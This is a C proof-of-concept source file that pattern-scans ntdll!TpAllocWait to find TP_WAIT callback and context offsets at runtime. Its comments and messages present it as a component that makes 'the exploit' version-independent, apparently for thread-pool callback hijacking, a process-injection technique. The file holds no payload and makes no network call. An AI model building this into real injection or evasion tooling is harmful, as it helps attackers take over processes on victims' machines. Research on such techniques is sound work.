#include <windows.h>
#include <stdio.h>

// Fox's Dynamic TP_WAIT Offset Resolver
// Jack called me out for hardcoding undocumented offsets (0x10, 0x18). He's right.
// Hardcoded offsets crash on different Windows builds.
// An Architect resolves them dynamically at runtime by analyzing the OS code.
// 
// How we do it:
// The exported API ntdll!TpSetWait takes a TP_WAIT pointer in RCX.
// Internally, it writes the provided Event and Timeout into the TP_WAIT structure.
// More importantly, ntdll!TpAllocWait (or internal functions it calls) writes the 
// Callback and Context into the structure.
// 
// For this PoC, we will pattern match the assembly of ntdll!TpAllocWait to dynamically 
// extract the exact offsets the current OS build uses for Callback and Context.

// A very basic, naive byte scanner for PoC purposes.
// In a real exploit, you'd use a lightweight disassembler engine (like Zydis or a custom length engine)
// to safely walk instructions.

BOOL ResolveTpWaitOffsets(PDWORD pCallbackOffset, PDWORD pContextOffset) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    // TpAllocWait(PTP_WAIT_CALLBACK Callback, PVOID Context, PTP_CALLBACK_ENVIRON CallbackEnviron)
    // The OS must store 'Callback' (RCX) and 'Context' (RDX) into the newly allocated TP_WAIT structure.
    PBYTE pTpAllocWait = (PBYTE)GetProcAddress(hNtdll, "TpAllocWait");
    if (!pTpAllocWait) return FALSE;

    printf("[+] Analyzing ntdll!TpAllocWait at %p\n", pTpAllocWait);

    BOOL foundCallback = FALSE;
    BOOL foundContext = FALSE;

    // We scan the first ~200 bytes of the function looking for instructions that 
    // store registers into the allocated structure.
    // Typical assembly looks like:
    // mov qword ptr [rax+10h], rcx  ; Storing Callback (RCX) into TP_WAIT (RAX) + 0x10
    // mov qword ptr [rax+18h], rdx  ; Storing Context (RDX) into TP_WAIT (RAX) + 0x18
    
    // Opcode for 'mov qword ptr [reg+disp8], reg' is often 48 89 XX [disp8]
    // Specifically:
    // 48 89 48 XX -> mov [rax+XX], rcx
    // 48 89 50 XX -> mov [rax+XX], rdx
    // 48 89 4B XX -> mov [rbx+XX], rcx (if structure pointer is in rbx)

    for (int i = 0; i < 200; i++) {
        // Look for REX.W (48) + MOV (89)
        if (pTpAllocWait[i] == 0x48 && pTpAllocWait[i+1] == 0x89) {
            
            BYTE modRm = pTpAllocWait[i+2];
            
            // Check if source register is RCX (Callback)
            // ModRM byte format: [Mod(2)][Reg(3)][Rm(3)]
            // Reg == 001 (RCX). Mod == 01 (disp8).
            if ((modRm & 0x38) == 0x08 && (modRm & 0xC0) == 0x40) {
                *pCallbackOffset = pTpAllocWait[i+3];
                foundCallback = TRUE;
                printf("    -> Found Callback offset: 0x%X\n", *pCallbackOffset);
            }

            // Check if source register is RDX (Context)
            // Reg == 010 (RDX). Mod == 01 (disp8).
            if ((modRm & 0x38) == 0x10 && (modRm & 0xC0) == 0x40) {
                *pContextOffset = pTpAllocWait[i+3];
                foundContext = TRUE;
                printf("    -> Found Context offset: 0x%X\n", *pContextOffset);
            }
        }

        if (foundCallback && foundContext) {
            return TRUE;
        }
    }

    return FALSE;
}

int main() {
    printf("[+] Starting Dynamic TP_WAIT Offset Resolver PoC.\n");

    DWORD callbackOffset = 0;
    DWORD contextOffset = 0;

    if (ResolveTpWaitOffsets(&callbackOffset, &contextOffset)) {
        printf("[!] Success. Dynamic Offsets Resolved for this OS build:\n");
        printf("    -> TP_WAIT->Callback Offset: 0x%X\n", callbackOffset);
        printf("    -> TP_WAIT->Context Offset: 0x%X\n", contextOffset);
        printf("[!] The exploit is now version-independent.\n");
    } else {
        printf("[-] Failed to dynamically resolve offsets. Assembly pattern may have changed or requires a full disassembler.\n");
    }

    return 0;
}